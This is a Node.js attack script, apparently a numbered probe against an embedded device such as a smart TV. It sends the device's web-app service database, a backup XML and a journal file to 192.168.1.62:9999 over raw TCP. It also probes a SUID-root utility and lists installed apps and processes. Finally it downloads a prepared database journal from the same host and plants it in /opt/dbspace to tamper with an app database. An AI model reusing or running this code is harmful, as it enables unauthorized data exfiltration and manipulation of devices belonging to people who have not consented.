"use strict";
/* p40: DIRECT PLACEMENT of hot journal by the module itself
   1. /opt/dbspace state + write test (uid 5001 = owner)
   2. WAS DB re-exfil (state after 118019 attempts) + app_backup.xml
   3. wasutility probes (SUID root) + grep -a on wascmd for error codes
   4. PLACEMENT: raw TCP HTTP GET journal from Mac :9999 -> /opt/dbspace/.app-context.db-journal
      (atomic: write .tmp then rename), md5 verify, report
   exfil /p40info
*/
var fs = null, cp = null, net = null, crypto = null;
try { fs = require('fs'); } catch (e) {}
try { cp = require('child_process'); } catch (e) {}
try { net = require('net'); } catch (e) {}
try { crypto = require('crypto'); } catch (e) {}

var HOST = '192.168.1.62';
var PORT = 9999;
var R = { ts: new Date().toISOString(), probe: 'p40', results: {}, log: [] };
var posted = false;

function L(s) { R.log.push(String(s).substring(0, 500)); }

function postBuf(path, buf) {
  var hdr = 'POST ' + path + ' HTTP/1.1\r\nHost: ' + HOST + ':9999\r\nContent-Type: application/octet-stream\r\nContent-Length: ' + buf.length + '\r\nConnection: close\r\n\r\n';
  try {
    var s = net.connect(PORT, HOST);
    s.setTimeout(60000, function () { s.destroy(); });
    s.on('connect', function () {
      s.write(hdr);
      var off = 0;
      var iv = setInterval(function () {
        if (off >= buf.length) { clearInterval(iv); setTimeout(function () { s.destroy(); }, 3000); return; }
        s.write(buf.slice(off, off + 65536));
        off += 65536;
      }, 50);
      setTimeout(function () { s.destroy(); }, 120000);
    });
    s.on('error', function (e) { L('postBuf err ' + e.message); });
  } catch (e) { L('postBuf ctor ' + e); }
}

function postFinal() {
  if (posted) return;
  posted = true;
  postBuf('/p40info', new Buffer(JSON.stringify(R), 'utf8'));
}

function run(cmd, timeoutMs) {
  timeoutMs = timeoutMs || 20000;
  return new Promise(function (resolve) {
    if (!cp) { resolve('[no child_process]'); return; }
    var out = '', err = '', done = false;
    var child;
    try { child = cp.spawn('sh', ['-c', cmd], { stdio: ['ignore', 'pipe', 'pipe'] }); }
    catch (e) { resolve('[spawn err ' + e + ']'); return; }
    var t = setTimeout(function () {
      if (done) return; done = true;
      try { child.kill('SIGKILL'); } catch (e) {}
      resolve('[timeout ' + timeoutMs + '] ' + (out || err).substring(0, 8000));
    }, timeoutMs);
    child.stdout.on('data', function (d) { out += d.toString(); });
    child.stderr.on('data', function (d) { err += d.toString(); });
    child.on('close', function (code) {
      if (done) return; done = true; clearTimeout(t);
      var s = (out || err);
      if (code !== 0) s = '[exit ' + code + '] ' + s;
      resolve(s.substring(0, 9000));
    });
    child.on('error', function (e) {
      if (done) return; done = true; clearTimeout(t);
      resolve('[err ' + e.message + ']');
    });
  });
}

function seq(steps) {
  var i = 0;
  function next() {
    if (i >= steps.length) { postFinal(); return; }
    var s = steps[i++];
    s.fn().then(function (r) {
      R.results[s.name] = r;
      next();
    }).catch(function (e) {
      R.results[s.name] = '[exception ' + e + ']';
      next();
    });
  }
  next();
}

function md5Buf(b) { return crypto.createHash('md5').update(b).digest('hex'); }

/* raw TCP HTTP GET: returns Promise<Buffer> of the body */
function httpGetBody(path) {
  return new Promise(function (resolve, reject) {
    var sock;
    try { sock = net.connect(PORT, HOST); } catch (e) { reject(String(e)); return; }
    sock.setTimeout(45000, function () { try { sock.destroy(); } catch (e) {} reject('socket timeout'); });
    var state = 'head';
    var headBuf = '';
    var need = -1;
    var chunks = [];
    var bodyLen = 0;
    var sent = false;
    sock.on('connect', function () {
      sent = true;
      sock.write('GET ' + path + ' HTTP/1.1\r\nHost: ' + HOST + ':9999\r\nConnection: close\r\n\r\n');
    });
    sock.on('data', function (d) {
      var data = new Buffer(d, 'binary');
      if (state === 'head') {
        headBuf += data.toString('binary');
        var idx = headBuf.indexOf('\r\n\r\n');
        if (idx < 0) return;
        var head = headBuf.substring(0, idx);
        var m = head.match(/Content-Length:\s*(\d+)/i);
        need = m ? parseInt(m[1], 10) : -1;
        if (need < 0) { reject('no content-length in: ' + head.substring(0, 200)); try { sock.destroy(); } catch (e) {} return; }
        state = 'body';
        data = new Buffer(headBuf.substring(idx + 4), 'binary');
        headBuf = '';
      }
      if (state === 'body') {
        if (data.length) { chunks.push(data); bodyLen += data.length; }
        if (need > 0 && bodyLen >= need) {
          var full = Buffer.concat(chunks);
          if (full.length > need) full = full.slice(0, need);
          try { sock.destroy(); } catch (e) {}
          resolve(full);
        }
      }
    });
    sock.on('error', function (e) { reject('sock err: ' + e.message); });
    sock.on('close', function () {
      if (state !== 'body' || chunks.length === 0) { reject('closed early, got ' + bodyLen + 'B'); }
    });
  });
}

var JPATH = '/opt/dbspace/.app-context.db-journal';
var JTMP = '/opt/dbspace/.app-context.db-journal.p40';
var LPATH = '/opt/dbspace/.app-context.db';
var WDB = '/opt/dbspace/.webappservice.db';
var EXPECTED_MD5 = '03683f81d337ce2224df6010456738e9';
var EXPECTED_SIZE = 49760;

var steps = [
  { name: 'dbspace_state', fn: function () {
      return run('ls -la /opt/dbspace/ 2>&1; echo ===; ls -la /opt/ 2>/dev/null | grep -E "dbspace|total"', 15000);
  }},
  { name: 'journal_before', fn: function () {
      var out = '';
      try {
        var b = fs.readFileSync(JPATH);
        out = 'size=' + b.length + ' md5=' + md5Buf(b);
      } catch (e) { out = 'read err ' + String(e); }
      try { postBuf('/journal_before2.bin', fs.readFileSync(JPATH)); } catch (e) {}
      return Promise.resolve(out);
  }},
  { name: 'write_test', fn: function () {
      var out = 'fs.write: ';
      try {
        fs.writeFileSync('/opt/dbspace/.p40test', 'p40 write test');
        var back = fs.readFileSync('/opt/dbspace/.p40test', 'utf8');
        fs.unlinkSync('/opt/dbspace/.p40test');
        out = back;
      } catch (e) { out = 'FAIL ' + String(e); }
      return Promise.resolve(out);
  }},
  { name: 'wasdb_reexfil', fn: function () {
      var out;
      try {
        var b = fs.readFileSync(WDB);
        out = 'size=' + b.length + ' md5=' + md5Buf(b);
        postBuf('/wasdb2.bin', b);
      } catch (e) { out = 'read err ' + String(e); }
      return Promise.resolve(out);
  }},
  { name: 'wasbackup_xml', fn: function () {
      var out;
      try {
        var b = fs.readFileSync('/opt/usr/apps/webappservice/wasdb_backup/app_backup.xml');
        out = 'size=' + b.length;
        postBuf('/wasbackup.xml', b);
      } catch (e) { out = 'read err ' + String(e); }
      return Promise.resolve(out);
  }},
  { name: 'wascmd_grep', fn: function () {
      return run('grep -a -o -E ".{60}118019.{60}" /usr/bin/wascmd 2>/dev/null | head -5; echo ===118012; grep -a -o -E ".{60}118012.{60}" /usr/bin/wascmd 2>/dev/null | head -5; echo ===WAS_ERR; grep -a -o -E "WAS_ERR_[A-Z_]+" /usr/bin/wascmd 2>/dev/null | sort -u | head -40', 30000);
  }},
  { name: 'wasutility_probe', fn: function () {
      return run('for a in v a d g f cntps re:cntps version status; do echo "== wasutility $a"; timeout 10 /usr/bin/wasutility $a 2>&1 | head -25; echo "[exit $?]"; done', 45000);
  }},
  { name: 'apps_dirs', fn: function () {
      return run('ls -la /opt/usr/apps/ 2>/dev/null | grep -iE "Fresh|Place|FreeMyTV|xvvl|webappservice"; echo ===; ls -la /opt/usr/home/owner/apps_rw/ 2>/dev/null | grep -iE "Fresh|Place|FreeMyTV|xvvl"; echo ===; ls -la /opt/usr/apps/FreshAppio 2>&1 | head -10; echo ===; ls -la /opt/usr/apps/PlaceAppio 2>&1 | head -10', 15000);
  }},
  { name: 'fresh1_proc', fn: function () {
      return run('ps -ef 2>/dev/null | grep -iE "Fresh|Place" | grep -v grep; echo "[exit $?]"', 15000);
  }},
  { name: 'placement', fn: function () {
      R.results.placement = 'downloading';
      return httpGetBody('/.app-context.db-journal').then(function (buf) {
        R.results.dl_size = buf.length;
        R.results.dl_md5 = md5Buf(buf);
        if (buf.length !== EXPECTED_SIZE) { R.results.placement = 'SIZE MISMATCH got ' + buf.length; return null; }
        if (md5Buf(buf) !== EXPECTED_MD5) { R.results.placement = 'MD5 MISMATCH ' + md5Buf(buf); return null; }
        fs.writeFileSync(JTMP, buf);
        var verify = fs.readFileSync(JTMP);
        if (verify.length !== EXPECTED_SIZE || md5Buf(verify) !== EXPECTED_MD5) {
          R.results.placement = 'VERIFY FAIL after write+readback';
          return null;
        }
        fs.renameSync(JTMP, JPATH);
        var final = fs.readFileSync(JPATH);
        R.results.journal_after = { size: final.length, md5: md5Buf(final) };
        R.results.journal_ok = (final.length === EXPECTED_SIZE && md5Buf(final) === EXPECTED_MD5);
        R.results.placement = 'PLACED';
        L('placement done, journal_ok=' + R.results.journal_ok);
        return null;
      }).catch(function (e) {
        R.results.placement = 'FAIL ' + String(e);
        return null;
      });
  }},
  { name: 'dbspace_after', fn: function () {
      return run('ls -la /opt/dbspace/ 2>&1 | head -15', 15000);
  }}
];

seq(steps);

setTimeout(function () { R.results.guard = 'global timeout'; postFinal(); }, 180000);
